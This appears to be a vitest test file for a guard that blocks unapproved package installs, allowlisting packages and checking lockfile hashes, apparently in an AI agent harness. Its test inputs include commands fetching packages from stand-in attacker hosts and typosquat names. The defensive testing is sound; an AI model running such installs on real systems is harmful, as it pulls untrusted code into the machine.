import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
	addToAllowlist,
	type Allowlist,
	allowlistPath,
	hashLockfile,
	loadAllowlist,
	saveAllowlist,
} from "../package-allowlist.js";
import { parseInstallCommands } from "../package-install-parser.js";
import type { HarnessDecision } from "../types.js";
import { evaluatePackageInstall } from "./package-install-guard.js";

let workspace: string;

beforeEach(() => {
	workspace = mkdtempSync(join(tmpdir(), "guard-test-"));
});

afterEach(() => {
	rmSync(workspace, { recursive: true, force: true });
});

function evalCmd(command: string): HarnessDecision {
	const commands = parseInstallCommands(command);
	const al = loadAllowlist(workspace);
	const r = evaluatePackageInstall(commands, workspace, al);
	return r ?? { decision: "allow" };
}

describe("evaluatePackageInstall — empty / non-install", () => {
	it("returns null when no install commands parsed", () => {
		const r = evaluatePackageInstall([], workspace, loadAllowlist(workspace));
		expect(r).toBeNull();
	});

	it("uninstall is allowed (no new code)", () => {
		expect(evalCmd("npm uninstall lodash").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — registry packages", () => {
	it("blocks unapproved npm package", () => {
		const r = evalCmd("npm install lodash");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/lodash/);
		expect(r.reason).toMatch(/allowlist/i);
	});

	it("allows approved npm package", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "qcody" });
		expect(evalCmd("npm install lodash").decision).toBe("allow");
	});

	it("blocks if ONE of multiple packages is unapproved", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash evil-typosquat");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil-typosquat/);
	});

	it("blocks pip install of unapproved package", () => {
		const r = evalCmd("pip install evil-package");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil-package/);
	});

	it("allows pip install of approved package", () => {
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		expect(evalCmd("pip install requests").decision).toBe("allow");
	});

	it("blocks cargo add of unapproved crate", () => {
		const r = evalCmd("cargo add evil");
		expect(r.decision).toBe("block");
	});

	it("blocks go get of unapproved module", () => {
		const r = evalCmd("go get github.com/evil/pkg");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — URL specs always blocked", () => {
	it("blocks git URL even if a same-name package is approved", () => {
		addToAllowlist(workspace, "npm", "foo", { approved_by: "x" });
		const r = evalCmd("npm install git+https://github.com/attacker/foo");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/git/i);
	});

	it("blocks tarball URL", () => {
		const r = evalCmd("npm install https://attacker.com/payload.tgz");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/tarball|url/i);
	});

	it("blocks pip git+URL", () => {
		const r = evalCmd("pip install git+https://github.com/attacker/foo");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — custom registry", () => {
	it("blocks --registry override even with allowlisted package", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash --registry http://attacker.com");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/registry/i);
	});

	it("blocks pip --index-url override", () => {
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		const r = evalCmd("pip install requests --index-url http://attacker.com");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — local_path allowed", () => {
	it("allows local-path install (workspace code, not a registry pkg)", () => {
		expect(evalCmd("npm install ./my-local-pkg").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — lockfile snapshots", () => {
	it("blocks `npm ci` when no snapshot exists for package-lock.json", () => {
		writeFileSync(join(workspace, "package-lock.json"), '{"name":"x"}');
		const r = evalCmd("npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/snapshot|allowlist/i);
	});

	it("allows `npm ci` when lockfile hash matches stored snapshot", () => {
		const lf = join(workspace, "package-lock.json");
		writeFileSync(lf, '{"name":"x"}');
		const sha = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: sha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm ci").decision).toBe("allow");
	});

	it("blocks `npm ci` when lockfile content changed after snapshot", () => {
		const lf = join(workspace, "package-lock.json");
		writeFileSync(lf, '{"name":"original"}');
		const originalHash = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: originalHash!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		// Mutate the lockfile
		writeFileSync(lf, '{"name":"mutated"}');
		const r = evalCmd("npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/changed|snapshot|drift/i);
	});
});

describe("evaluatePackageInstall — manifest-only sync (npm install no args)", () => {
	it("blocks bare `npm install` when no snapshot exists", () => {
		writeFileSync(join(workspace, "package.json"), '{"dependencies":{"foo":"1"}}');
		const r = evalCmd("npm install");
		expect(r.decision).toBe("block");
	});

	it("allows `npm install` when package.json hash matches snapshot (no lockfile)", () => {
		const mf = join(workspace, "package.json");
		writeFileSync(mf, '{"dependencies":{"foo":"1"}}');
		const sha = hashLockfile(mf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package.json": {
					sha256: sha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm install").decision).toBe("allow");
	});

	it("prefers lockfile snapshot over manifest snapshot when both exist", () => {
		const mf = join(workspace, "package.json");
		const lf = join(workspace, "package-lock.json");
		writeFileSync(mf, '{"dependencies":{"foo":"1"}}');
		writeFileSync(lf, '{"name":"lock"}');
		const lockSha = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: lockSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm install").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — effective cwd (P1.4)", () => {
	it("`cd packages/app && npm ci` checks the SUBDIR's lockfile, not root's", () => {
		// Root lockfile + matching root snapshot
		const rootLf = join(workspace, "package-lock.json");
		writeFileSync(rootLf, '{"name":"root"}');
		const rootSha = hashLockfile(rootLf);
		// Subdir lockfile, NO snapshot for it
		mkdirSync(join(workspace, "packages/app"), { recursive: true });
		writeFileSync(
			join(workspace, "packages/app/package-lock.json"),
			'{"name":"subapp"}',
		);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: rootSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		// Without P1.4 this would silently pass against root snapshot.
		const r = evalCmd("cd packages/app && npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/packages\/app|snapshot|mismatch/i);
	});

	it("matches a subdir snapshot when cd'd into that subdir", () => {
		mkdirSync(join(workspace, "packages/app"), { recursive: true });
		const subLf = join(workspace, "packages/app/package-lock.json");
		writeFileSync(subLf, '{"name":"subapp"}');
		const subSha = hashLockfile(subLf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: subSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("cd packages/app && npm ci").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — compound", () => {
	it("blocks the whole compound if any segment is unapproved", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash && pip install evil");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil/);
	});

	it("allows when every segment is approved", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		expect(evalCmd("npm install lodash && pip install requests").decision).toBe("allow");
	});
});
